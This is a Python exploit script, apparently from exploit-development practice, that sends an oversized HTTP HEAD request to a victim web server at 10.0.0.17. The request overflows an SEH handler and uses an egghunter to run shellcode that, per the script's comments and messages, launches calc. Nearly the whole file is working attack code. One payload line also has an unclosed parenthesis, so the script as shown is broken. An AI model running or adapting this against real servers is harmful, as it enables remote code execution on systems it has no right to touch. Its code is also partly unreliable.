#!/usr/bin/python

import socket
from struct import *

victim_host = "10.0.0.17"
victim_port = 80

nseh = "\xEB\xCE\x90\x90" # lets jump back so we have room for the egghunter
seh = "\xdd\x97\x40\x00" # POP POP RETN from !mona seh, test a bunch to find a workin nullbyte address
# SEH handler overwritten with - 43336143
#[*] Exact match at offset 1569
# Log data, item 23
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018ff78 overwritten with normal pattern : 0x43336143 (offset 1569), followed by 125 bytes of cyclic data after the handler
"""
testing addresses with null00 byte
0040578A
0040578A
00405B72
00405B85
0040B225
"""

egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter +="\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# !mona egg -t w00t - 32 bytes

shellcode_calc =  "w00tw00t"
shellcode_calc += "\xb8\x4a\x6d\x5e\x8f\xd9\xcc\xd9\x74\x24"
shellcode_calc += "\xf4\x5e\x33\xc9\xb1\x31\x31\x46\x13\x83"
shellcode_calc += "\xee\xfc\x03\x46\x45\x8f\xab\x73\xb1\xcd"
shellcode_calc += "\x54\x8c\x41\xb2\xdd\x69\x70\xf2\xba\xfa"
shellcode_calc += "\x22\xc2\xc9\xaf\xce\xa9\x9c\x5b\x45\xdf"
shellcode_calc += "\x08\x6b\xee\x6a\x6f\x42\xef\xc7\x53\xc5"
shellcode_calc += "\x73\x1a\x80\x25\x4a\xd5\xd5\x24\x8b\x08"
shellcode_calc += "\x17\x74\x44\x46\x8a\x69\xe1\x12\x17\x01"
shellcode_calc += "\xb9\xb3\x1f\xf6\x09\xb5\x0e\xa9\x02\xec"
shellcode_calc += "\x90\x4b\xc7\x84\x98\x53\x04\xa0\x53\xef"
shellcode_calc += "\xfe\x5e\x62\x39\xcf\x9f\xc9\x04\xe0\x6d"
shellcode_calc += "\x13\x40\xc6\x8d\x66\xb8\x35\x33\x71\x7f"
shellcode_calc += "\x44\xef\xf4\x64\xee\x64\xae\x40\x0f\xa8"
shellcode_calc += "\x29\x02\x03\x05\x3d\x4c\x07\x98\x92\xe6"
shellcode_calc += "\x33\x11\x15\x29\xb2\x61\x32\xed\x9f\x32"
shellcode_calc += "\x5b\xb4\x45\x94\x64\xa6\x26\x49\xc1\xac"
shellcode_calc += "\xca\x9e\x78\xef\x80\x61\x0e\x95\xe6\x62"
shellcode_calc += "\x10\x96\x56\x0b\x21\x1d\x39\x4c\xbe\xf4"
shellcode_calc += "\x7e\xac\x4f\xc5\x6a\x39\xf6\xbc\xd7\x27"
shellcode_calc += "\x09\x6b\x1b\x5e\x8a\x9e\xe3\xa5\x92\xea"
shellcode_calc += "\xe6\xe2\x14\x06\x9a\x7b\xf1\x28\x09\x7b"
shellcode_calc += "\xd0\x4a\xcc\xef\xb8\xa2\x6b\x88\x5b\xbb"

exploit_payload  = "A" * (1569 - len(shellcode_calc) + shellcode_calc
exploit_payload += "\xcc"*30 + egghunter
exploit_payload += nseh
exploit_payload += seh
exploit_payload += "G" * 8000

http_request  = "HEAD /" + exploit_payload + " HTTP/1.1\r\n"
http_request += "Host: \r\n"
http_request += "User-Agent: firefox \r\n"
http_request += "If-Modified-Since: Wed \r\n\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

try:
	expl.connect((victim_host, victim_port))
	print("[*] Establishing a connection to the vicitm")
	expl.send(http_request)
	print("[*] Sending the payload")
	expl.close()
	print("[*] Watch for a spawned calc")
except:
	print("[!] Exploit failed to send")
